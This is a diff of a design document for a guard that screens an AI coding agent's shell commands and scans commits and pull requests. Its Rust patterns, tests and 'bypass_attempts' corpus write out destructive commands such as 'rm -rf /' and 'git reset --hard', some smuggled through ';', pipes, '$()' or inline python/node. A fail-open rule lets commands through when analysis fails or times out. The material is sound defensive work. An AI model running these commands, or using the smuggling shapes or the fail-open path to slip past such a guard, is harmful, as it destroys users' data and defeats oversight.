+            AstPattern::new("rm -rf $PATH", "Recursive force deletion"),
+            AstPattern::new("git reset --hard", "Hard reset"),
+            AstPattern::new("git push --force", "Force push"),
+            AstPattern::new("dd if=$SRC of=$DST", "Low-level disk write"),
+        ],
+    }
+});
+
+/// Match AST patterns against extracted content.
+pub fn match_ast_patterns(
+    content: &str,
+    language: Language,
+) -> Result<Vec<AstMatch>, AstError> {
+    let patterns = AST_PATTERNS.get(&language).ok_or(AstError::UnsupportedLanguage)?;
+
+    // Parse content with tree-sitter
+    let tree = parse_content(content, language)?;
+
+    let mut matches = Vec::new();
+    for pattern in patterns {
+        for node_match in pattern.find_matches(&tree) {
+            matches.push(AstMatch {
+                pattern_name: pattern.name.to_string(),
+                reason: pattern.reason.to_string(),
+                matched_text: node_match.text().to_string(),
+                line: node_match.start_position().row + 1,
+            });
+        }
+    }
+
+    Ok(matches)
+}
+```
+
+### Language Detection
+
+```rust
+/// Infer language from context.
+pub fn detect_heredoc_language(
+    command: &str,
+    heredoc: &HeredocContent,
+) -> Language {
+    // 1. Check interpreter prefix
+    if command.starts_with("python") { return Language::Python; }
+    if command.starts_with("ruby") { return Language::Ruby; }
+    if command.starts_with("node") { return Language::JavaScript; }
+
+    // 2. Check delimiter hints
+    let delim = heredoc.delimiter.to_uppercase();
+    if delim.contains("PY") || delim == "PYTHON" { return Language::Python; }
+    if delim.contains("JS") || delim == "JAVASCRIPT" { return Language::JavaScript; }
+    if delim.contains("RB") || delim == "RUBY" { return Language::Ruby; }
+
+    // 3. Check shebang
+    if heredoc.body.starts_with("#!/usr/bin/env python") { return Language::Python; }
+    if heredoc.body.starts_with("#!/usr/bin/python") { return Language::Python; }
+    if heredoc.body.starts_with("#!/bin/bash") { return Language::Bash; }
+
+    // 4. Content heuristics
+    if heredoc.body.contains("import os") || heredoc.body.contains("def ") { return Language::Python; }
+    if heredoc.body.contains("require(") || heredoc.body.contains("const ") { return Language::JavaScript; }
+
+    // 5. Default to bash for shell-like content
+    Language::Bash
+}
+```
+
+### Fail-Open Semantics
+
+```rust
+/// Analyze heredoc with graceful failure handling.
+pub fn analyze_heredoc_safe(
+    content: &HeredocContent,
+    config: &Config,
+) -> Decision {
+    match analyze_heredoc_internal(content, config) {
+        Ok(decision) => decision,
+        Err(e) => {
+            // Log error but fail-open
+            tracing::warn!(
+                "Heredoc analysis failed, allowing command: {:?}",
+                e
+            );
+            Decision::Allow {
+                reason: "Heredoc analysis failed (fail-open)".to_string(),
+            }
+        }
     }
 }
 ```
 
-#### Integration with Decision Pipeline
+### Tests Required
 
 ```rust
-pub fn check_command(command: &str, config: &Config) -> Decision {
-    // ... quick reject ...
+#[test]
+fn test_heredoc_detection_python() {
+    let cmd = r#"python3 << EOF
+import os
+os.system("rm -rf /")
+EOF"#;
 
-    // Check allowlist EARLY (before expensive pattern matching)
-    if let Some(allowlist) = &config.allowlist {
-        if let Some(entry) = allowlist.matches(command) {
-            return Decision::Allow {
-                reason: format!("Allowlist: {}", entry.reason()),
-            };
-        }
+    let decision = evaluate_command(cmd, &Config::default(), None);
+    assert!(matches!(decision, Decision::Deny { .. }));
+}
+
+#[test]
+fn test_inline_script_detection() {
+    let commands = vec![
+        r#"bash -c "rm -rf /""#,
+        r#"python -c "import os; os.system('rm -rf /')""#,
+        r#"node -e "require('child_process').execSync('rm -rf /')""#,
+    ];
+
+    for cmd in commands {
+        let decision = evaluate_command(cmd, &Config::default(), None);
+        assert!(matches!(decision, Decision::Deny { .. }), "Should block: {}", cmd);
     }
+}
 
-    // ... continue with pattern matching ...
+#[test]
+fn test_heredoc_timeout() {
+    // Construct a command that would cause slow parsing
+    let huge_heredoc = format!("cat << EOF\n{}\nEOF", "x".repeat(10_000_000));
+
+    let start = Instant::now();
+    let decision = evaluate_command(&huge_heredoc, &Config::default(), None);
+    let elapsed = start.elapsed();
+
+    // Should fail-open within timeout
+    assert!(elapsed.as_millis() < 100);
+    assert!(matches!(decision, Decision::Allow { .. }));
 }
 ```
 
 ### Implementation Phases
 
-**Phase 1: Core Allowlist (2-3 days)**
-- Allowlist data structures and parsing
-- Load `.dcg/allowlist.toml` on startup
-- Exact and prefix matching
-- Integration with decision pipeline
+**Phase 1: Tier 1 Triggers (1-2 days)**
+- Implement `needs_deep_analysis()` with RegexSet
+- Add to evaluation pipeline as early check
+- Benchmark to ensure <100μs
 
-**Phase 2: CLI Commands (1-2 days)**
-- `dcg allow` command
-- `dcg allowlist` (list, remove, validate)
-- Proper TOML formatting on save
+**Phase 2: Tier 2 Extraction (2-3 days)**
+- Heredoc body extraction with limits
+- Inline script extraction
+- Timeout handling and fail-open
 
-**Phase 3: Interactive Learning (2-3 days)**
-- TTY detection
-- Interactive prompt on block
-- Automatic entry creation
-- Context detection heuristics
+**Phase 3: Language Detection (1-2 days)**
+- Interpreter prefix detection
+- Delimiter hints
+- Shebang parsing
+- Content heuristics
 
-**Phase 4: Pattern Matching & Safety (1-2 days)**
-- Pattern-based allows with risk acknowledgment
-- Expiration handling
-- Validation and warnings
-- Documentation
+**Phase 4: Tier 3 AST Matching (3-5 days)**
+- Integrate ast-grep-core
+- Define patterns for Python, JavaScript, Ruby, Bash
+- Structural matching implementation
 
 ---
 
-## 3. Pre-Commit Hook Integration
+## 6. Pre-Commit Hook & GitHub Action
 
 ### Overview
 
-Pre-commit hook integration allows DCG to scan files before they're committed, catching dangerous patterns in shell scripts, CI configs, Dockerfiles, and other files that will be executed later.
+Extend DCG protection beyond Claude Code to the entire development workflow:
+- **Pre-commit hook**: Scan files before commit
+- **GitHub Action**: Scan PRs before merge
 
-### The Problem It Solves
-
-The current DCG hook only protects real-time command execution by Claude. But dangerous commands can enter the codebase through:
-
-1. **Shell scripts**: A developer writes `rm -rf $UNINIT_VAR` in a cleanup script
-2. **CI configs**: A GitHub Action uses `docker system prune -af` without safeguards
-3. **Makefiles**: A build target contains `git reset --hard`
-4. **Dockerfiles**: A `RUN` command has dangerous operations
-
-These commands sit dormant until executed—potentially in production, potentially causing data loss.
-
-### The Solution
-
-A pre-commit hook that scans staged files:
+### Pre-Commit Hook
 
 ```bash
 $ dcg install-hook
@@ -874,11 +1587,9 @@ $ dcg install-hook
 ✓ Created configuration at .dcg/hooks.toml
 
 Configuration:
-  Scan patterns: *.sh, *.bash, Makefile, *.mk, *.yml, *.yaml, Dockerfile*
+  Scan patterns: *.sh, *.bash, Makefile, *.yml, *.yaml, Dockerfile*
   Check commit messages: true
   Fail on: error (warnings are advisory)
-
-To customize: edit .dcg/hooks.toml
 ```
 
 When committing:
@@ -894,582 +1605,206 @@ $ git commit -m "Add deployment script"
 │                                                                 │
 │  scripts/deploy.sh                                              │
 │  ├─ Line 15: rm -rf ${DEPLOY_DIR}/*                             │
-│  │  ├─ Pattern: core.filesystem:rm-rf-variable                  │
+│  │  ├─ Rule: core.filesystem:rm-rf-variable                     │
 │  │  ├─ Risk: Unvalidated variable in recursive deletion         │
 │  │  └─ Suggestion: Validate DEPLOY_DIR before deletion          │
 │  │                                                              │
 │  ├─ Line 28: git reset --hard origin/main                       │
-│  │  ├─ Pattern: core.git:hard-reset                             │
+│  │  ├─ Rule: core.git:hard-reset                                │
 │  │  ├─ Risk: Can permanently lose local commits                 │
 │  │  └─ Suggestion: Use git fetch && git checkout instead        │
 │  │                                                              │
 │  └─ 2 issues found (1 error, 1 warning)                         │
 │                                                                 │
-│  .github/workflows/deploy.yml                                   │
-│  └─ OK (no issues)                                              │
-│                                                                 │
-│  Makefile                                                       │
-│  └─ OK (no issues)                                              │
+│  .github/workflows/deploy.yml: OK                               │
+│  Makefile: OK                                                   │
 │                                                                 │
 ├─────────────────────────────────────────────────────────────────┤
 │  Summary: 1 error, 1 warning in 3 files                         │
-│                                                                 │
 │  ✗ Commit blocked due to errors.                                │
 │                                                                 │
-│  To commit anyway (not recommended):                            │
+│  To fix:                                                        │
+│    1. Address the issues above, or                              │
+│    2. dcg allowlist add <rule> --reason "..."                   │
+│                                                                 │
+│  To bypass (not recommended):                                   │
 │    git commit --no-verify                                       │
-│                                                                 │
-│  To add an allowlist entry:                                     │
-│    dcg allow --file scripts/deploy.sh:15 --reason "..."         │
-│                                                                 │
 └─────────────────────────────────────────────────────────────────┘
 ```
 
-### Configuration
-
-```toml
-# .dcg/hooks.toml
-
-[pre_commit]
-# File patterns to scan (gitignore-style globs)
-scan_patterns = [
-    "*.sh",
-    "*.bash",
-    "*.zsh",
-    "Makefile",
-    "*.mk",
-    "*.yml",
-    "*.yaml",
-    "Dockerfile*",
-    ".github/**/*.yml",
-    ".gitlab-ci.yml",
-    "Jenkinsfile",
-    "*.tf",  # Terraform
-]
-
-# Patterns to exclude
-exclude_patterns = [
-    "vendor/**",
-    "node_modules/**",
-    "**/test/**",  # Exclude test directories
-]
-
-# Severity threshold for blocking commit
-# Options: "error", "warning", "none" (advisory only)
-fail_on = "error"
-
-# Check commit message for dangerous patterns
-check_commit_message = true
-
-# Maximum file size to scan (bytes)
-max_file_size = 1048576  # 1MB
-
-# Show suggestions for fixing issues
-show_suggestions = true
-
-# Run in parallel (number of threads, 0 = auto)
-parallel = 0
-```
-
-### File Type Detection
-
-DCG detects the language/format of each file to apply appropriate scanning:
-
-| File Pattern | Language | Scan Strategy |
-|--------------|----------|---------------|
-| `*.sh`, `*.bash` | Bash | Full shell command scanning |
-| `Makefile`, `*.mk` | Make | Scan recipe lines (after tabs) |
-| `*.yml`, `*.yaml` | YAML | Scan `run:`, `script:`, `command:` values |
-| `Dockerfile*` | Docker | Scan `RUN`, `CMD`, `ENTRYPOINT` |
-| `*.tf` | Terraform | Scan `provisioner` and `local-exec` blocks |
-| `Jenkinsfile` | Groovy | Scan `sh`, `bash`, `bat` steps |
-
-### Commit Message Scanning
-
-Commit messages are also scanned:
-
-```bash
-$ git commit -m "Hotfix: run rm -rf / to clean up"
-
-┌─────────────────────────────────────────────────────────────────┐
-│  DCG Pre-Commit Scan                                            │
-├─────────────────────────────────────────────────────────────────┤
-│                                                                 │
-│  ⚠️  Warning in commit message:                                 │
-│                                                                 │
-│  "Hotfix: run rm -rf / to clean up"                             │
-│           └────────────┘                                        │
-│           Pattern: core.filesystem:rm-rf-root                   │
-│                                                                 │
-│  This appears to reference a dangerous command.                 │
-│  If this is intentional documentation, proceed with:            │
-│    git commit --no-verify                                       │
-│                                                                 │
-└─────────────────────────────────────────────────────────────────┘
-```
-
-Note: Commit message warnings don't block by default (configurable).
-
-### Integration with Popular Hook Managers
-
-#### Husky (Node.js)
-
-```json
-// package.json
-{
-  "husky": {
-    "hooks": {
-      "pre-commit": "dcg scan --staged"
-    }
-  }
-}
-```
-
-#### Lefthook
+### GitHub Action
 
 ```yaml
-# lefthook.yml
-pre-commit:
-  commands:
-    dcg:
-      run: dcg scan --staged
-      fail_text: "DCG found dangerous patterns. Run 'dcg explain' for details."
+# .github/workflows/dcg.yml
+name: DCG Security Scan
+
+on:
+  pull_request:
+    branches: [main, master]
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      pull-requests: write
+
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0
+
+      - name: DCG Security Scan
+        uses: anthropics/dcg-action@v1
+        with:
+          fail_on: error
+          scan_paths: |
+            **/*.sh
+            **/*.bash
+            **/Makefile
+            **/*.yml
+            **/*.yaml
+            **/Dockerfile*
+          comment_on_pr: true
+          github_token: ${{ secrets.GITHUB_TOKEN }}
 ```
 
-#### Pre-commit (Python)
+PR comment when issues found:
 
-```yaml
-# .pre-commit-config.yaml
-repos:
-  - repo: https://github.com/anthropics/dcg
-    rev: v0.2.0
-    hooks:
-      - id: dcg-scan
-        name: DCG Security Scan
-        entry: dcg scan --staged
-        language: system
-        pass_filenames: false
-```
+```markdown
+## 🛡️ DCG Security Scan Results
 
-### CLI Commands
+**2 issues found** in this pull request.
 
-```bash
-# Install hook directly
-$ dcg install-hook
-$ dcg install-hook --manager husky
-$ dcg install-hook --manager lefthook
+### ❌ Errors (blocking)
 
-# Scan staged files manually
-$ dcg scan --staged
+<details>
+<summary><code>scripts/deploy.sh</code> - 1 error</summary>
 
-# Scan specific files
-$ dcg scan scripts/deploy.sh Makefile
+**Line 45:** `rm -rf ${DEPLOY_DIR}/*`
 
-# Scan entire directory
-$ dcg scan --recursive ./scripts
+| | |
+|---|---|
+| **Rule** | `core.filesystem:rm-rf-variable` |
+| **Risk** | Unvalidated variable in recursive deletion |
+| **Suggestion** | Validate `DEPLOY_DIR` before deletion |
 
-# Scan with different severity threshold
-$ dcg scan --staged --fail-on warning
+</details>
 
-# Output as JSON (for CI integration)
-$ dcg scan --staged --format json
+### ⚠️ Warnings (advisory)
 
-# Fix mode (interactive, where possible)
-$ dcg scan --staged --fix
-```
+<details>
+<summary><code>.github/workflows/cleanup.yml</code> - 1 warning</summary>
 
-### Fix Mode
+**Line 23:** `docker system prune -af`
 
-For some patterns, DCG can suggest or apply fixes:
+| | |
+|---|---|
+| **Rule** | `containers.docker:system-prune-force` |
+| **Risk** | Removes all unused resources without confirmation |
 
-```bash
-$ dcg scan --staged --fix
+</details>
 
-scripts/deploy.sh:15
-  - rm -rf ${DEPLOY_DIR}/*
-  + if [ -n "${DEPLOY_DIR}" ] && [ -d "${DEPLOY_DIR}" ]; then
-  +   rm -rf "${DEPLOY_DIR:?}"/*
-  + fi
-
-Apply this fix? [y/N/e(xplain)]
-```
-
-### Technical Design
-
-#### New Module: `src/scan.rs`
-
-```rust
-use std::path::Path;
-
-#[derive(Debug)]
-pub struct ScanResult {
-    pub file: PathBuf,
-    pub issues: Vec<ScanIssue>,
-}
-
-#[derive(Debug)]
-pub struct ScanIssue {
-    pub line: usize,
-    pub column: usize,
-    pub severity: Severity,
-    pub pattern: PatternMatch,
-    pub line_content: String,
-    pub suggestion: Option<String>,
-}
-
-#[derive(Debug, Clone, Copy)]
-pub enum Severity {
-    Error,
-    Warning,
-    Info,
-}
-
-pub struct Scanner {
-    config: ScanConfig,
-    allowlist: Allowlist,
-}
-
-impl Scanner {
-    /// Scan a single file.
-    pub fn scan_file(&self, path: &Path) -> Result<ScanResult, ScanError> {
-        let content = std::fs::read_to_string(path)?;
-        let language = detect_language(path);
-        let commands = extract_commands(&content, language);
-
-        let mut issues = Vec::new();
-        for (line_num, command) in commands {
-            if let Decision::Deny { pattern, reason } = check_command(&command) {
-                issues.push(ScanIssue {
-                    line: line_num,
-                    column: 0,
-                    severity: pattern.severity(),
-                    pattern: pattern,
-                    line_content: command.clone(),
-                    suggestion: get_suggestion(&pattern),
-                });
-            }
-        }
-
-        Ok(ScanResult { file: path.to_path_buf(), issues })
-    }
-
-    /// Scan all staged files in git.
-    pub fn scan_staged(&self) -> Result<Vec<ScanResult>, ScanError> {
-        let staged_files = git_staged_files()?;
-        let filtered = self.filter_files(&staged_files);
-
-        filtered
-            .par_iter()  // Parallel scanning with rayon
-            .map(|path| self.scan_file(path))
-            .collect()
-    }
-}
-
-/// Extract executable commands from file content based on language.
-fn extract_commands(content: &str, language: Language) -> Vec<(usize, String)> {
-    match language {
-        Language::Bash => extract_bash_commands(content),
-        Language::Makefile => extract_makefile_recipes(content),
-        Language::Yaml => extract_yaml_commands(content),
-        Language::Dockerfile => extract_dockerfile_commands(content),
-        // ...
-    }
-}
+---
+*Scanned by [DCG](https://github.com/anthropics/dcg) v0.2.0*
 ```
 
 ### Implementation Phases
 
-**Phase 1: Core Scanner (2-3 days)**
-- File scanning with pattern matching
-- Language detection and command extraction
-- Basic output formatting
+**Phase 1: Pre-Commit Scanner (3-4 days)**
+- File scanning with language detection
+- `dcg scan --staged` command
+- Hook installation
 
-**Phase 2: Git Integration (1-2 days)**
-- `--staged` flag for scanning staged files
-- Hook installation (`dcg install-hook`)
-- Commit message scanning
-
-**Phase 3: Hook Manager Integration (1-2 days)**
-- Husky configuration generation
-- Lefthook configuration generation
-- pre-commit (Python) hook definition
-
-**Phase 4: Advanced Features (2-3 days)**
-- Parallel scanning with rayon
-- Fix mode for simple patterns
-- JSON output for CI integration
-- Allowlist for file:line entries
+**Phase 2: GitHub Action (3-4 days)**
+- Docker container with DCG binary
+- PR comment posting
+- Check status integration
 
 ---
 
-## 4. Comprehensive Test Infrastructure
+## 7. Test Infrastructure & Performance Guardrails
 
 ### Overview
 
-A robust testing strategy using property-based testing (proptest) to discover edge cases and fuzzing (cargo-fuzz) to find crashes, ensuring DCG is reliable under all conditions.
+Security tools must be reliable and fast. This improvement ensures DCG never hangs, never crashes, and stays performant as features grow.
 
-### The Problem It Solves
-
-Security tools must be reliable. A crash, panic, or incorrect result in DCG could:
-
-1. **Allow dangerous commands**: A parsing bug might miss a destructive pattern
-2. **Block safe commands**: A regex bug might match too broadly
-3. **Crash and fail open**: A panic might cause the hook to exit non-zero, allowing the command
-
-Current testing (unit tests, E2E tests) catches known cases but misses:
-- Edge cases with unusual input (unicode, long strings, special characters)
-- Boundary conditions (empty strings, exactly 1MB files, etc.)
-- Unexpected combinations of patterns
-- Parser bugs with malformed input
-
-### The Solution
-
-#### Property-Based Testing with proptest
-
-Define invariants that must hold for all inputs:
+### Property-Based Testing
 
 ```rust
-use proptest::prelude::*;
-
 proptest! {
-    /// Normalization is idempotent: normalizing twice gives same result as once.
+    /// Normalization is idempotent.
     #[test]
-    fn normalization_is_idempotent(cmd in ".*") {
+    fn normalization_idempotent(cmd in ".*") {
         let once = normalize_command(&cmd);
         let twice = normalize_command(&once);
-        prop_assert_eq!(once, twice, "Normalization should be idempotent");
-    }
-
-    /// Quick reject is consistent with full check for non-matching commands.
-    #[test]
-    fn quick_reject_consistency(cmd in "[a-z]+") {
-        // Commands without dangerous keywords should be rejected quickly
-        // and also allowed by full check
-        if global_quick_reject(&cmd) == QuickRejectResult::Skip {
-            let decision = check_command(&cmd);
-            prop_assert!(
-                matches!(decision, Decision::Allow),
-                "Quick-rejected command should also be allowed by full check"
-            );
-        }
+        prop_assert_eq!(once, twice);
     }
 
     /// No command causes a panic.
     #[test]
     fn no_panics(cmd in ".*") {
-        // This should never panic, regardless of input
         let _ = std::panic::catch_unwind(|| {
-            check_command(&cmd)
+            evaluate_command(&cmd, &Config::default(), None)
         });
     }
 
-    /// Known-safe commands are always allowed.
+    /// Decisions are deterministic.
     #[test]
-    fn safe_commands_allowed(cmd in safe_command_strategy()) {
-        let decision = check_command(&cmd);
-        prop_assert!(
-            matches!(decision, Decision::Allow),
-            "Safe command was incorrectly blocked: {}", cmd
-        );
-    }
-
-    /// Known-dangerous commands are always blocked.
-    #[test]
-    fn dangerous_commands_blocked(cmd in dangerous_command_strategy()) {
-        let decision = check_command(&cmd);
-        prop_assert!(
-            matches!(decision, Decision::Deny { .. }),
-            "Dangerous command was incorrectly allowed: {}", cmd
-        );
-    }
-
-    /// Decision is deterministic: same input always gives same output.
-    #[test]
-    fn deterministic_decision(cmd in ".*") {
-        let result1 = check_command(&cmd);
-        let result2 = check_command(&cmd);
-        prop_assert_eq!(
-            std::mem::discriminant(&result1),
-            std::mem::discriminant(&result2),
-            "Decision should be deterministic"
-        );
+    fn deterministic(cmd in ".*") {
+        let r1 = evaluate_command(&cmd, &Config::default(), None);
+        let r2 = evaluate_command(&cmd, &Config::default(), None);
+        prop_assert_eq!(std::mem::discriminant(&r1), std::mem::discriminant(&r2));
     }
 }
 ```
 
-#### Custom Generators
+### Fuzzing Targets
 
 ```rust
-/// Generate commands that are known to be safe.
-fn safe_command_strategy() -> impl Strategy<Value = String> {
-    prop_oneof![
-        // Simple safe commands
-        Just("git status".to_string()),
-        Just("git log".to_string()),
-        Just("git diff".to_string()),
-        Just("ls -la".to_string()),
-        Just("pwd".to_string()),
-
-        // Parameterized safe commands
-        "[a-z]{1,10}".prop_map(|name| format!("git checkout -b {}", name)),
-        "[a-z]{1,20}".prop_map(|msg| format!("git commit -m \"{}\"", msg)),
-
-        // Safe rm variants
-        "/tmp/[a-z]{1,10}".prop_map(|path| format!("rm -rf {}", path)),
-    ]
-}
-
-/// Generate commands that are known to be dangerous.
-fn dangerous_command_strategy() -> impl Strategy<Value = String> {
-    prop_oneof![
-        // Hard reset variants
-        Just("git reset --hard".to_string()),
-        "HEAD~[0-9]{1,2}".prop_map(|ref_| format!("git reset --hard {}", ref_)),
-        "[a-z]{1,10}".prop_map(|branch| format!("git reset --hard origin/{}", branch)),
-
-        // Force push variants
-        Just("git push --force".to_string()),
-        Just("git push -f origin main".to_string()),
-
-        // Dangerous rm variants
-        Just("rm -rf /".to_string()),
-        Just("rm -rf ~".to_string()),
-        Just("rm -rf .".to_string()),
-        "\\$[A-Z]{1,10}".prop_map(|var| format!("rm -rf {}", var)),
-    ]
-}
-
-/// Generate edge-case inputs.
-fn edge_case_strategy() -> impl Strategy<Value = String> {
-    prop_oneof![
-        // Empty and whitespace
-        Just("".to_string()),
-        Just(" ".to_string()),
-        Just("\t\n\r".to_string()),
-
-        // Unicode
-        "\\p{L}{1,100}".prop_map(|s| format!("git commit -m \"{}\"", s)),
-
-        // Very long commands
-        ".{10000,20000}",
-
-        // Special characters
-        "[\\x00-\\x1f\\x7f-\\xff]{1,100}",
-
-        // Nested quotes
-        Just("git commit -m \"foo \\\"bar\\\" baz\"".to_string()),
-
-        // Command injection attempts
-        Just("git status; rm -rf /".to_string()),
-        Just("git status && rm -rf /".to_string()),
-        Just("git status | rm -rf /".to_string()),
-        Just("$(rm -rf /)".to_string()),
-        Just("`rm -rf /`".to_string()),
-    ]
-}
-```
-
-#### Fuzzing with cargo-fuzz
-
-```rust
-// fuzz/fuzz_targets/check_command.rs
-#![no_main]
-use libfuzzer_sys::fuzz_target;
-use destructive_command_guard::check_command;
-
+// fuzz/fuzz_targets/evaluate.rs
 fuzz_target!(|data: &[u8]| {
     if let Ok(s) = std::str::from_utf8(data) {
-        // Should never panic
-        let _ = check_command(s);
+        let _ = evaluate_command(s, &Config::default(), None);
     }
 });
-```
 
-```rust
-// fuzz/fuzz_targets/parse_heredoc.rs
-#![no_main]
-use libfuzzer_sys::fuzz_target;
-use destructive_command_guard::heredoc::parse_heredoc;
-
+// fuzz/fuzz_targets/heredoc.rs
 fuzz_target!(|data: &[u8]| {
     if let Ok(s) = std::str::from_utf8(data) {
-        // Should never panic
-        let _ = parse_heredoc(s);
+        let _ = extract_heredocs(s, &HEREDOC_LIMITS);
     }
 });
-```
 
-```rust
-// fuzz/fuzz_targets/json_input.rs
-#![no_main]
-use libfuzzer_sys::fuzz_target;
-use destructive_command_guard::hook::parse_hook_input;
-
+// fuzz/fuzz_targets/tokenizer.rs
 fuzz_target!(|data: &[u8]| {
-    // Should handle any input gracefully
-    let _ = parse_hook_input(data);
+    if let Ok(s) = std::str::from_utf8(data) {
+        let _ = tokenize_command(s);
+    }
 });
 ```
 
-#### Regression Test Corpus
-
-Maintain a corpus of known edge cases:
-
-```
-tests/corpus/
-├── false_positives/
-│   ├── bd_create_description.txt     # bd create --description="rm -rf example"
-│   ├── git_commit_message.txt        # git commit -m "fix rm -rf bug"
-│   ├── grep_pattern.txt              # rg "rm -rf" src/
-│   └── echo_example.txt              # echo "Example: git reset --hard"
-├── true_positives/
-│   ├── rm_rf_root.txt                # rm -rf /
-│   ├── git_reset_hard.txt            # git reset --hard HEAD~5
-│   └── force_push_main.txt           # git push --force origin main
-├── edge_cases/
-│   ├── unicode_command.txt           # git commit -m "修复问题"
-│   ├── very_long_command.txt         # ls [repeated 10000 times]
-│   ├── null_bytes.txt                # git\x00status
-│   └── nested_quotes.txt             # git commit -m "foo \"bar\" baz"
-└── bypass_attempts/
-    ├── semicolon_injection.txt       # git status; rm -rf /
-    ├── pipe_injection.txt            # git status | rm -rf /
-    ├── subshell_injection.txt        # $(rm -rf /)
-    └── backtick_injection.txt        # `rm -rf /`
-```
-
-Each file contains a command that is tested for correct handling:
+### Performance Budgets
 
 ```rust
-#[test]
-fn test_false_positive_corpus() {
-    for entry in glob("tests/corpus/false_positives/*.txt").unwrap() {
-        let path = entry.unwrap();
-        let command = std::fs::read_to_string(&path).unwrap().trim().to_string();
-        let decision = check_command(&command);
-        assert!(
-            matches!(decision, Decision::Allow),
-            "False positive not fixed: {} in {:?}",
-            command,
-            path
-        );
-    }
-}
+/// Performance budget for command evaluation.
+pub const PERFORMANCE_BUDGET: PerformanceBudget = PerformanceBudget {
+    // Fast path (no heredocs, no inline scripts)
+    quick_reject_max_us: 10,
+    normalization_max_us: 5,
+    safe_pattern_check_max_us: 100,
+    destructive_pattern_check_max_us: 200,
+    total_fast_path_max_us: 500,
 
-#[test]
-fn test_true_positive_corpus() {
-    for entry in glob("tests/corpus/true_positives/*.txt").unwrap() {
-        let path = entry.unwrap();
-        let command = std::fs::read_to_string(&path).unwrap().trim().to_string();
-        let decision = check_command(&command);
-        assert!(
-            matches!(decision, Decision::Deny { .. }),
-            "True positive missed: {} in {:?}",
-            command,
-            path
-        );
-    }
-}
+    // Slow path (heredocs, inline scripts)
+    heredoc_extraction_max_ms: 5,
+    ast_parsing_max_ms: 10,
+    total_slow_path_max_ms: 20,
+
+    // Hard caps (fail-open beyond these)
+    absolute_max_ms: 50,
+    max_command_length: 1_048_576,  // 1MB
+};
 ```
 
 ### CI Integration
@@ -1493,7 +1828,7 @@ jobs:
     steps:
       - uses: actions/checkout@v4
       - uses: dtolnay/rust-toolchain@stable
-      - run: cargo test --features proptest -- --ignored proptest
+      - run: cargo test proptest -- --ignored
 
   fuzzing:
     runs-on: ubuntu-latest
@@ -1501,444 +1836,196 @@ jobs:
       - uses: actions/checkout@v4
       - uses: dtolnay/rust-toolchain@nightly
       - run: cargo install cargo-fuzz
-      - run: cargo +nightly fuzz run check_command -- -max_total_time=300
-      - run: cargo +nightly fuzz run parse_heredoc -- -max_total_time=300
-      - run: cargo +nightly fuzz run json_input -- -max_total_time=300
+      - run: cargo +nightly fuzz run evaluate -- -max_total_time=300
+      - run: cargo +nightly fuzz run heredoc -- -max_total_time=300
 
-  corpus-tests:
+  benchmarks:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - uses: dtolnay/rust-toolchain@stable
-      - run: cargo test corpus
+      - run: cargo bench --bench performance
+      - name: Check performance budget
+        run: |
+          # Fail if any benchmark exceeds budget
+          cargo bench --bench performance -- --save-baseline current
+          cargo bench --bench performance -- --compare baseline current
 ```
-
-### Implementation Phases
-
-**Phase 1: Property-Based Testing (2-3 days)**
-- Add proptest to dev-dependencies
-- Define core invariants (idempotence, determinism, no panics)
-- Create generators for safe/dangerous/edge-case commands
-
-**Phase 2: Fuzzing Setup (1-2 days)**
-- Set up cargo-fuzz with fuzz targets
-- Create targets for each parser/entry point
-- Add to CI with time-limited runs
-
-**Phase 3: Regression Corpus (1-2 days)**
-- Create corpus directory structure
-- Populate with known edge cases
-- Add corpus-based tests
-
-**Phase 4: CI Integration (1 day)**
-- Add GitHub Actions workflows
-- Configure fuzzing in CI
-- Set up artifact collection for failures
 
 ---
 
-## 5. GitHub Action for CI/CD Protection
-
-### Overview
-
-A GitHub Action that scans pull requests for dangerous patterns in scripts, configs, and other files, providing visibility to reviewers and optionally blocking merge.
-
-### The Problem It Solves
-
-Even with local hooks, dangerous patterns can enter the codebase:
-
-1. **Developers skip hooks**: `git commit --no-verify` bypasses pre-commit
-2. **External contributors**: Open-source contributors may not have DCG installed
-3. **Direct GitHub edits**: Web-based editing bypasses all local hooks
-4. **Automated tooling**: Bots and automation might not run local checks
-
-CI is the last line of defense before code is merged.
-
-### The Solution
-
-A GitHub Action that runs on pull requests:
-
-```yaml
-# .github/workflows/dcg.yml
-name: DCG Security Scan
-
-on:
-  pull_request:
-    branches: [main, master]
-
-jobs:
-  scan:
-    runs-on: ubuntu-latest
-    permissions:
-      contents: read
-      pull-requests: write  # For PR comments
-
-    steps:
-      - uses: actions/checkout@v4
-        with:
-          fetch-depth: 0  # Full history for diff
-
-      - name: DCG Security Scan
-        uses: anthropics/dcg-action@v1
-        with:
-          # Severity threshold for failing the check
-          fail_on: error  # or 'warning', 'none'
-
-          # File patterns to scan
-          scan_paths: |
-            **/*.sh
-            **/*.bash
-            **/Makefile
-            **/*.yml
-            **/*.yaml
-            **/Dockerfile*
-            **/*.tf
-
-          # Patterns to exclude
-          exclude_paths: |
-            vendor/**
-            node_modules/**
-            **/*.test.*
-
-          # Post a comment on the PR with findings
-          comment_on_pr: true
-
-          # Show suggestions in the comment
-          show_suggestions: true
-
-          # GitHub token for API access
-          github_token: ${{ secrets.GITHUB_TOKEN }}
-```
-
-### PR Comment Output
-
-When issues are found, the action posts a comment:
-
-```markdown
-## 🛡️ DCG Security Scan Results
-
-**2 issues found** in this pull request.
-
-### ❌ Errors (blocking)
-
-<details>
-<summary><code>scripts/deploy.sh</code> - 1 error</summary>
-
-**Line 45:** `rm -rf ${DEPLOY_DIR}/*`
-
-| | |
-|---|---|
-| **Pattern** | `core.filesystem:rm-rf-variable` |
-| **Risk** | Unvalidated variable in recursive deletion could delete unintended files |
-| **Suggestion** | Validate `DEPLOY_DIR` is set and within expected directory:<br><pre>if [ -z "${DEPLOY_DIR}" ]; then<br>  echo "DEPLOY_DIR not set" >&2<br>  exit 1<br>fi<br>rm -rf "${DEPLOY_DIR:?}"/*</pre> |
-
-</details>
-
-### ⚠️ Warnings (advisory)
-
-<details>
-<summary><code>.github/workflows/cleanup.yml</code> - 1 warning</summary>
-
-**Line 23:** `docker system prune -af`
-
-| | |
-|---|---|
-| **Pattern** | `containers.docker:system-prune-force` |
-| **Risk** | Removes all unused images, containers, and volumes without confirmation |
-| **Suggestion** | Consider `docker system prune --filter "until=24h"` to only remove old resources |
-
-</details>
-
----
-
-<details>
-<summary>📚 How to resolve these issues</summary>
-
-1. **Fix the code** - Address the issues identified above
